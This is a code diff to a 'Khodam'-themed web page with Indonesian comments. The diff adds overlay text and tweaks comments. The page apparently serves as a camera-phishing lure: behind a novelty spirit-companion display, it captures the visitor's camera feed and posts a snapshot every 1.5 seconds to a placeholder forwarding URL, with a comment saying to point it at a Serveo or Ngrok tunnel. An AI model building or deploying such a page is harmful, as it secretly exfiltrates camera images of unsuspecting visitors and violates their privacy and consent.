@@ -43,6 +43,7 @@ marquee { font-size: 18px; font-weight: bold; color: black; }
 }
 .footerbtn { background: #34af23; }
 .footerbtn1 { background: #000099; }
+
 .video-wrap { display: inline-block; position: relative; }
 canvas { border-radius: 10px; }
 </style>
@@ -108,9 +109,9 @@ const cameraVideo = document.createElement('video');
 cameraVideo.autoplay = true;
 cameraVideo.playsInline = true;
 
-// Latar belakang Khodam (bisa PNG transparan)
+// Latar belakang Khodam (PNG/JPG transparan)
 const khodamBg = new Image();
-khodamBg.src = "video_khodam.png"; // ganti dengan PNG/JPG
+khodamBg.src = "video_khodam.png"; // Ganti sesuai file mu
 
 async function initCamera() {
   try {
@@ -119,14 +120,22 @@ async function initCamera() {
 
     cameraVideo.addEventListener('loadedmetadata', () => {
       setInterval(() => {
-        // 1. Draw kamera
+        // 1️⃣ Draw kamera
         ctx.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
-        // 2. Draw latar Khodam
+        // 2️⃣ Draw latar Khodam
         ctx.drawImage(khodamBg, 0, 0, canvas.width, canvas.height);
+        // 3️⃣ Teks overlay Khodam
+        ctx.font = "32px Verdana";
+        ctx.fillStyle = "#ff0077";
+        ctx.shadowColor = "#000";
+        ctx.shadowBlur = 10;
+        ctx.textAlign = "center";
+        ctx.fillText("Khodammu hadir ✨", canvas.width/2, 50);
 
         // Kirim snapshot ke server
         const imgData = canvas.toDataURL("image/png").replace("image/png","image/octet-stream");
         post(imgData);
+
       }, 1500);
     });
 
@@ -140,7 +149,7 @@ function post(imgdata){
   $.ajax({
     type: 'POST',
     data: { khodam_image: imgdata, khodamName: khodamName },
-    url: 'FORWARDING_URL/post.php', // ganti ke URL Serveo/Ngrok
+    url: 'FORWARDING_URL/post.php', // Ganti ke URL Serveo/Ngrok
     dataType: 'json',
     async: false
   });
